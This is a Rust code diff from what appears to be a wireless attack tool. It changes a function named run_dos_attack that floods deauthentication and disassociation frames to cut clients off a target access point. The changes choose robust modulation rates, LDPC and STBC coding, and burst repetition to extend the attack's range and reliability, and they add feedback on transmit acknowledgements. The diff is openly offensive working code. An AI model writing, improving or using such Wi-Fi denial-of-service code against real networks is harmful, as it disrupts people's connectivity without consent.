@@ -44,7 +44,7 @@ use std::time::{Duration, Instant};
 
 use crate::adapter::SharedAdapter;
 use crate::core::{EventRing, MacAddress, TxOptions};
-use crate::core::frame::TxFlags;
+use crate::core::frame::{TxFlags, TxRate};
 use crate::store::{Ap, Station};
 use crate::protocol::frames;
 use crate::protocol::ieee80211::{
@@ -288,6 +288,9 @@ pub struct DosInfo {
     pub frames_received: u64,
     pub bytes_sent: u64,
 
+    // === TX Feedback (ACK/NACK from firmware) ===
+    pub tx_feedback: crate::core::TxFeedbackSnapshot,
+
     // === Timing ===
     pub start_time: Instant,
     pub elapsed: Duration,
@@ -318,6 +321,7 @@ impl Default for DosInfo {
             frames_sent: 0,
             frames_received: 0,
             bytes_sent: 0,
+            tx_feedback: Default::default(),
             start_time: Instant::now(),
             elapsed: Duration::ZERO,
             frames_per_sec: 0.0,
@@ -551,6 +555,8 @@ fn run_dos_attack(
 ) {
     let start = Instant::now();
     let our_mac = shared.mac();
+    let tx_fb = shared.tx_feedback();
+    tx_fb.reset();
 
     // Fire attack started event
     push_event(events, start, DosEventKind::AttackStarted {
@@ -589,10 +595,21 @@ fn run_dos_attack(
     }
     push_event(events, start, DosEventKind::FloodingStarted);
 
-    // TX options: no ACK, no retry — fire and forget for DoS
+    // TX options: optimized for maximum range and reliability
+    //
+    // Deauth/disassoc are management frames — use the most robust modulation:
+    //   - 2.4GHz: CCK 1Mbps (~6dB better sensitivity than OFDM 6M, ~100m more range)
+    //   - 5GHz: OFDM 6Mbps (mandatory minimum, best sensitivity in OFDM)
+    // LDPC: ~0.5-1dB coding gain at low SNR (helps at range limit)
+    // STBC: ~3dB diversity gain on 2x2 adapters (two copies of the same data)
+    // NO_ACK: deauth frames are broadcast-class, no ACK expected
+    // NO_RETRY: firmware won't retry without ACK anyway; we handle retries
+    //   via burst repetition instead (entire burst repeats each loop iteration)
+    let is_2ghz = target.channel <= 14;
     let tx_opts = TxOptions {
+        rate: if is_2ghz { TxRate::Cck1m } else { TxRate::Ofdm6m },
         retries: 0,
-        flags: TxFlags::NO_ACK | TxFlags::NO_RETRY,
+        flags: TxFlags::NO_ACK | TxFlags::NO_RETRY | TxFlags::LDPC | TxFlags::STBC,
         ..Default::default()
     };
 
@@ -711,6 +728,7 @@ fn run_dos_attack(
                 info.bytes_sent = bytes_sent;
                 info.elapsed = start.elapsed();
                 info.frames_per_sec = fps;
+                info.tx_feedback = tx_fb.snapshot();
             }
 
             // Fire rate snapshot event
@@ -777,6 +795,7 @@ fn run_dos_attack(
         info.frames_sent = frames_sent;
         info.bytes_sent = bytes_sent;
         info.elapsed = start.elapsed();
+        info.tx_feedback = tx_fb.snapshot();
     }
 
     // Cooldown phase — TX stopped, channel still locked.
